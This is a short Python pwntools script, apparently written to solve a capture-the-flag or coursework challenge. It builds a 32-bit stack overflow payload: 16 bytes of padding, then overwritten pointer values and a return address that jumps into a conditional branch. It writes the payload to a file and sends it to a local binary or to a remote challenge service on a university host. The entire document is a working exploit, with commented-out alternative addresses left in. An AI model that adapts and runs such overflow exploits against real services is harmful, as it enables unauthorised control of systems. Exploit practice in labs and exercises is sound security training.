from pwn import *

#0x804a000 ebx 
#0x080486f4 inside if

payload = b'A'*16
payload += p32(0xffffa001)
#payload += p32(0xffff00a0)
payload += p32(0x0804a008)
#payload += p32(0x0804a000)
payload += p32(0xffffd0b8)
#payload += p32(0x080486f0)
payload += p32(0x080486f4)
f = open('exploitBYTES', 'wb')
f.write(payload)
f.close

def local():
    context(arch='i386', os='linux')
    s = process('./bin')
    print(s.hexdump)
    s.sendline(payload)
    s.interactive()

def web():
    r = remote('mustard.stt.rnl.tecnico.ulisboa.pt', 9995)
    r.send(payload)
    print(r.recv())

web()

